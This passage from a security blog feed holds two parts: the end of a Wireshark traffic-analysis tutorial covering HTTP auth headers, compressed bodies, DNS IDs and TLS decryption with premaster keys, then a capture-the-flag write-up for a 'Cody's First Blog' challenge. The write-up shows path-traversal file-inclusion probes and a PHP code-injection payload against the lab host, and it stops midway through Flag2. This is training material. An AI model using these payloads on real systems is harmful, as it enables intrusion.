&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: curl&#x2F;7.38.0
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Accept: *&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;HTTP&#x2F;1.1 200 OK 
&lt;&#x2F;span&gt;&lt;span&gt;Etag: 103f70-8-5b7a70d6
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: text&#x2F;html
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 8
&lt;&#x2F;span&gt;&lt;span&gt;Last-Modified: Mon, 20 Aug 2018 07:42:14 GMT
&lt;&#x2F;span&gt;&lt;span&gt;Server: WEBrick&#x2F;1.3.1 (Ruby&#x2F;2.1.5&#x2F;2014-11-13)
&lt;&#x2F;span&gt;&lt;span&gt;Date: Mon, 20 Aug 2018 08:05:31 GMT
&lt;&#x2F;span&gt;&lt;span&gt;Connection: Keep-Alive
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Welcome
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Authorization header example:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET &#x2F; HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Authorization: Basic YWRtaW46NjhiZGFiMzAtZmJmNy00Njc5LTgxZWMtZDBmOGM2MTNhNGMy
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: curl&#x2F;7.38.0
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Accept: *&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;HTTP&#x2F;1.1 200 OK
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;X-Powered-By: PHP&#x2F;5.6.38-0+deb8u1
&lt;&#x2F;span&gt;&lt;span&gt;Content-type: text&#x2F;html; charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;html&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;title&amp;gt;Welcome to TestLabs&amp;lt;&#x2F;title&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;&#x2F;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;h1&amp;gt;The key is not here!&amp;lt;&#x2F;h1&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;&#x2F;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;html&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Decode the Authorization header by using &lt;code&gt;base64&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;echo &amp;#39;YWRtaW46NjhiZGFiMzAtZmJmNy00Njc5LTgxZWMtZDBmOGM2MTNhNGMy&amp;#39; | base64 -D
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JWT header example:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET &#x2F; HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: curl&#x2F;7.38.0
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Accept: *&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJteV9rZXkiOiIxYzRiNzQ5My0wODZkLTQ4MDUtYTY3Yi1kMjRkMmQ3NjBkODIifQ._OFtLxzAf72yb0xlud0wYlEQMPWXw5szxDIKhiW0yIw
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;HTTP&#x2F;1.1 200 OK
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;X-Powered-By: PHP&#x2F;5.6.38-0+deb8u1
&lt;&#x2F;span&gt;&lt;span&gt;Content-type: text&#x2F;html; charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;html&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;title&amp;gt;Welcome to TestLabs&amp;lt;&#x2F;title&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;&#x2F;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;h1&amp;gt;The key is not here!&amp;lt;&#x2F;h1&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;&#x2F;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;html&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Decode the JWT token using &lt;code&gt;jwt-cli&lt;&#x2F;code&gt; tool:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;jwt decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJteV9rZXkiOiIxYzRiNzQ5My0wODZkLTQ4MDUtYTY3Yi1kMjRkMmQ3NjBkODIifQ._OFtLxzAf72yb0xlud0wYlEQMPWXw5szxDIKhiW0yIw
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;http-follow-tcp-stream-vs-http-stream&quot;&gt;HTTP: Follow TCP Stream vs HTTP Stream&lt;&#x2F;h3&gt;
&lt;p&gt;This is what the output would look like when you follow the TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET &#x2F; HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: curl&#x2F;7.38.0
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Accept: *&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;HTTP&#x2F;1.1 200 OK
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;X-Powered-By: PHP&#x2F;5.6.38-0+deb8u1
&lt;&#x2F;span&gt;&lt;span&gt;Content-Encoding: gzip
&lt;&#x2F;span&gt;&lt;span&gt;Vary: Accept-Encoding
&lt;&#x2F;span&gt;&lt;span&gt;Content-type: text&#x2F;html; charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;..........5.A
&lt;&#x2F;span&gt;&lt;span&gt;. .D.=...$j...O.E...5~1.$..Mn_S....{....w...}&amp;lt;C.4SA..2m..mp..p&amp;#39;|.|.].O..C6l...Y.GFx....q2..Q....)..fL.Y..s.*.A^.H4a......4.Q.....
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As you can see, the stream is not decoded correctly as this is a display of a ASCII format. In order to read the body of the HTTP packet, you need to
follow the stream as HTML instead and it would detect the &lt;code&gt;Content-Encoding&lt;&#x2F;code&gt; type and decode accordingly:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET &#x2F; HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: curl&#x2F;7.38.0
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Accept: *&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;HTTP&#x2F;1.1 200 OK
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;X-Powered-By: PHP&#x2F;5.6.38-0+deb8u1
&lt;&#x2F;span&gt;&lt;span&gt;Content-Encoding: gzip
&lt;&#x2F;span&gt;&lt;span&gt;Vary: Accept-Encoding
&lt;&#x2F;span&gt;&lt;span&gt;Content-type: text&#x2F;html; charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;html&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;title&amp;gt;Welcome to TestLabs&amp;lt;&#x2F;title&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;&#x2F;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;h1&amp;gt;The key is MYPASSWORD123&amp;lt;&#x2F;h1&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &amp;lt;&#x2F;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;html&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The more difficult way to do this is follow the TCP stream as usual, convert the content type as RAW instead of ASCII and save the file as &lt;code&gt;.gz&lt;&#x2F;code&gt;
because the &lt;code&gt;Content-Encoding&lt;&#x2F;code&gt; type. Manually extract the &lt;code&gt;.gz&lt;&#x2F;code&gt; file afterwards. As an example, this method can be performed for &lt;code&gt;Content-Encoding: deflated&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET &#x2F; HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: curl&#x2F;7.38.0
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Accept: *&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: deflate
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;HTTP&#x2F;1.1 200 OK
&lt;&#x2F;span&gt;&lt;span&gt;Host: server
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;X-Powered-By: PHP&#x2F;5.6.38-0+deb8u1
&lt;&#x2F;span&gt;&lt;span&gt;Content-Encoding: deflate
&lt;&#x2F;span&gt;&lt;span&gt;Vary: Accept-Encoding
&lt;&#x2F;span&gt;&lt;span&gt;Content-type: text&#x2F;html; charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;x.5.A.. .E..b&amp;lt;..%...p...L\C..FZ.;..^*..??....Kv&amp;#39;....#..3grO.cY....V...}..vm&amp;gt;....P...S....E;....&amp;#39;....&amp;#39;&#x2F;..R .%.........U.7a........-
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Keep in mind, the difference between &lt;code&gt;gzip&lt;&#x2F;code&gt; and &lt;code&gt;deflate&lt;&#x2F;code&gt; is the way it compresses the data. &lt;code&gt;deflate&lt;&#x2F;code&gt; uses &lt;code&gt;zlib&lt;&#x2F;code&gt; which will require a header to
reconstruct the file:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;vi data
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;x.5.A.. .E..b&amp;lt;..%...p...L\C..FZ.;..^*..??....Kv&amp;#39;....#..3grO.cY....V...}..vm&amp;gt;....P...S....E;....&amp;#39;....&amp;#39;&#x2F;..R .%.........U.7a........-
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we need to insert the &lt;code&gt;zlib&lt;&#x2F;code&gt; header for &lt;code&gt;gzip&lt;&#x2F;code&gt; to recognize the file for extraction:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;printf &amp;quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&amp;quot; | cat - data | gunzip
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;dns-reading-dns-queries&quot;&gt;DNS: Reading DNS Queries&lt;&#x2F;h2&gt;
&lt;p&gt;To read DNS queries, select the DNS protocol captured, in the Packet Details window, there is a &lt;code&gt;Queries&lt;&#x2F;code&gt; dropdown menu of which will display the DNS
query types and the answer provided from the server. Keep in mind, DNS queries can also be sent using TCP so keep an eye out for those data streams when identifying DNS
protocols.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;dns-predictable-transaction-ids&quot;&gt;DNS: Predictable Transaction IDs&lt;&#x2F;h3&gt;
&lt;p&gt;There is an old attack called &amp;quot;Birthday Attack&amp;quot; of which forged DNS response queries with predictable transaction ID is sent to the client before the real DNS
response is received. To analyze the DNS transaction ID, select the DNS packet and view the Packet Details window, select the &lt;code&gt;Domain Name System (query)&lt;&#x2F;code&gt; dropdown to view the &lt;code&gt;Transaction ID&lt;&#x2F;code&gt; field. If the ID starts with &lt;code&gt;0x0000&lt;&#x2F;code&gt;, there might be a chance that the next packet sent is
predictable. View the pattern from the rest of the DNS data stream to try and identify a sequential pattern by converting the hexadecimal to decimal. Be aware, this attack doesn&#x27;t commonly
found with the exception of IoT and legacy devices.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;birthdayattack.png&quot; alt=&quot;birthdayattack&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;icmp-finding-covert-data&quot;&gt;ICMP: Finding covert data&lt;&#x2F;h2&gt;
&lt;p&gt;ICMP protocols can be used as a covert channel to send information from one system to another without raising alarms.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;icmp-covert.png&quot; alt=&quot;icmp_covert&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tls-1-2-identifying-certificate-names&quot;&gt;TLS 1.2: Identifying Certificate Names&lt;&#x2F;h2&gt;
&lt;p&gt;Client TLS connections perform a handshake with a server endpoint. Identifying the certificate used in the handshake process can reveal information about the server being established by the client. This is good for tracing encrypted communication and perform additional reconnaissance.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-certificate.png&quot; alt=&quot;tls-handshake&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;tls-1-2-server-name-indication-sni&quot;&gt;TLS 1.2: Server Name Indication (SNI)&lt;&#x2F;h3&gt;
&lt;p&gt;Like a HTTP server, using HTTP headers can indicate where responses are being sent and the responses received. When TLS is applied to the HTTP request, the HTTP headers do not get initiated until the TLS connection is established first. This is where exploration of TLS extension called Server Name Indiciation (SNI) is important to learn about.&lt;&#x2F;p&gt;
&lt;p&gt;A single IP may host multiple TLS server on the same port and the server needs to identify what certificate it needs to send to the client. If the server sends the wrong certificate to the client, it will be rejected by the client. The way to indicate the certificate that belongs to which server is using SNI. The client will send a TLS handshake request to the server and the server will serve the certificate being requested. By looking at the TLS packet, you can find where the TLS traffic is being requested by the client.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-sni.png&quot; alt=&quot;tls-sni&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;tls-1-2-decrypting-using-private-key&quot;&gt;TLS 1.2: Decrypting using Private Key&lt;&#x2F;h3&gt;
&lt;p&gt;Wireshark has the ability to decrypt TLS connections if provided a private key to read the communication. However, this only applies if the connection does not use Forward Secrecy. Forward Secrecy is used to prevent mishaps such as leaked private keys or broken cryptography from being used to decrypt the traffic prior to the compromise to cleartext.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-privatekey.png&quot; alt=&quot;tls-privatekey&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-decrypt.png&quot; alt=&quot;tls-decrypt&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-decrypted-http.png&quot; alt=&quot;tls-decrypted-http&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;tls-1-2-forward-secrecy-and-pre-master-key&quot;&gt;TLS 1.2: Forward Secrecy and Pre-master Key&lt;&#x2F;h3&gt;
&lt;p&gt;If the captured TLS traffic is using Forward Secrecy, you cannot decrypt the connection with the server&#x27;s private key. This ensures that if the server&#x27;s private key is compromised, someone sniffing the traffic prior to the compromise cannot recover the cleartext traffic. However, by modifying the client or the server, it&#x27;s possible to retrieve the pre-shared key used to secure the communication using premaster key. The premaster key is essentially the two random numbers used in the encryption process between client and server. If you have the premaster key along with the server&#x27;s private key, you can decrypt the TLS stream using forward secrecy.&lt;&#x2F;p&gt;
&lt;p&gt;Add the private key to the TLS key settings:
&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-privatekey2.png&quot; alt=&quot;tls-privatekey2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-decrypt2.png&quot; alt=&quot;tls-decrypt2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Configure the debug output in order to view the decrypted results. This step will allow you to debug the TLS sessions in play and you can follow play by play with how the TLS session is doing:
&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-debug.png&quot; alt=&quot;tls-debug&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-debug2.png&quot; alt=&quot;tls-debug2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Configure the premaster key:
&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-premasterkey.png&quot; alt=&quot;tls-premaster&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The premaster key file contains the following:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;CLIENT_RANDOM 0297ECADDD0596D3BDAFA2439DD9981F830290B9244BB9DF8E518F6078217F85A88112AF1D1BA6661EB48427D880AC182752764D104F1C42608883DFC594991ADFFEB6578311FF97195C061FD1DF1997
&lt;&#x2F;span&gt;&lt;span&gt;CLIENT_RANDOM 0297ECADDD0596D3BDAFA2439DD9981F830290B9244BB9DF8E518F6078217F85A88112AF1D1BA6661EB48427D880AC182752764D104F1C42608883DFC594991ADFFEB6578311FF97195C061FD1DF1997
&lt;&#x2F;span&gt;&lt;span&gt;CLIENT_RANDOM 7D1522A21B103244102DFB4EB1AF935DF3A0A3053D942EEB7A87F9D270AF37C531660A7646F61D5B1ABA597BFC726B53A9C337A2DD0D29684FD48FD3BD0C936EA21D62AB749ED08AADDF5DDB7AEA36DF
&lt;&#x2F;span&gt;&lt;span&gt;CLIENT_RANDOM 7D1522A21B103244102DFB4EB1AF935DF3A0A3053D942EEB7A87F9D270AF37C531660A7646F61D5B1ABA597BFC726B53A9C337A2DD0D29684FD48FD3BD0C936EA21D62AB749ED08AADDF5DDB7AEA36DF
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-premaster2.png&quot; alt=&quot;tls-premaster2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The TLS stream should be now decrypted and you can follow the TLS stream to view the decrypted traffic. Lastly, pay attention to the bottom where an arrow is marked.
&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;tls-premaster-decrypt.png&quot; alt=&quot;tls-premaster-decrypt&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;mysql-login-and-password&quot;&gt;MySQL: Login and Password&lt;&#x2F;h2&gt;
&lt;p&gt;MySQL request and responses can be read in plaintext only if encryption is not used.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;mysql.png&quot; alt=&quot;mysql&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Cody&#x27;s First Blog</title>
        <published>2020-12-31T00:00:00+00:00</published>
        <updated>2020-12-31T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/h1-codysfirstblog/" type="text/html"/>
        <id>https://johntuyen.com/posts/h1-codysfirstblog/</id>
        
        <content type="html">&lt;h3 id=&quot;flag0&quot;&gt;Flag0&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;Cody&#x27;s First Blog&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;Inspecting the source reveals a URL that leads to an admin page:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;!--&amp;lt;a href=&amp;quot;?page=admin.auth.inc&amp;quot;&amp;gt;Admin login&amp;lt;&#x2F;a&amp;gt;--&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Navigation to URL:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;34.74.105.127&#x2F;1512748f68&#x2F;?page=admin.auth.inc
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;After poking around the page, I noticed there might be a potential for LFI. This enumeration process can at least can give us recon on what is running on the backend.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;Notice: Undefined variable: title in &#x2F;app&#x2F;index.php on line 30
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Warning: include(..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;hosts.php): failed to open stream: No such file or directory in &#x2F;app&#x2F;index.php on line 21
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Warning: include(): Failed opening &amp;#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;hosts.php&amp;#39; for inclusion (include_path=&amp;#39;.:&#x2F;usr&#x2F;share&#x2F;php:&#x2F;usr&#x2F;share&#x2F;pear&amp;#39;) in &#x2F;app&#x2F;index.php on line 21
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Took note for files that had permission denied.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;Notice: Undefined variable: title in &#x2F;app&#x2F;index.php on line 30
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Warning: include(&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log.php): failed to open stream: Permission denied in &#x2F;app&#x2F;index.php on line 21
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Warning: include(): Failed opening &amp;#39;&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log.php&amp;#39; for inclusion (include_path=&amp;#39;.:&#x2F;usr&#x2F;share&#x2F;php:&#x2F;usr&#x2F;share&#x2F;pear&amp;#39;) in &#x2F;app&#x2F;index.php on line 21
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;images&#x2F;h1&#x2F;h1-codysfirstblog-1.png&quot; alt=&quot;burp-intruder&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Going back to the enumeration process again, I figured that if there is a text box and it&#x27;s running PHP on the backend, testing for injection of PHP code would be the logical next step:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;?php phpinfo(); ?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;images&#x2F;h1&#x2F;h1-codysfirstblog-2.png&quot; alt=&quot;flag0&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Voila, flag0 has been captured.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;flag1&quot;&gt;Flag1&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Circling back to the first flag, I&#x27;ve found the admin page but haven&#x27;t discovered any vulnerabilities yet. The admin page has a login form and a text box. The text box can be used to submit comments waiting for approval. I&#x27;m guessing this means that there must be an approval page somewhere to be found. During my enumeration of possible hidden files and directories, I&#x27;ve managed to guess the file &lt;code&gt;admin.inc&lt;&#x2F;code&gt; which leads to an admin page to approve comments. Flag1 has been captured.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;images&#x2F;h1&#x2F;h1-codysfirstblog-3.png&quot; alt=&quot;admin-approval&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;flag2&quot;&gt;Flag2&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Circling back to the potential LFI vulnerability, I tried enumerating the files using nullbytes but no luck. I tried using SQL injection authentication bypass methods and no luck either. After reading the hints given, it does mention LFI is the likely vulnerability to be targeting for. In my first attempt in flag0, I&#x27;ve identified the possibilities of the files that can be read with denied permissions. What I didn&#x27;t check for is, can I actually read the &lt;code&gt;index.php&lt;&#x2F;code&gt; file that is being hosted? I started to look for ways to read files using PHP injection.&lt;&#x2F;p&gt;
&lt;p&gt;I took notes while I was tinkering around the possibilties, I know I can read files in the local app directory:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;34.74.105.127&#x2F;fea3c7d20a&#x2F;?page=..&#x2F;app&#x2F;admin.auth.inc
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
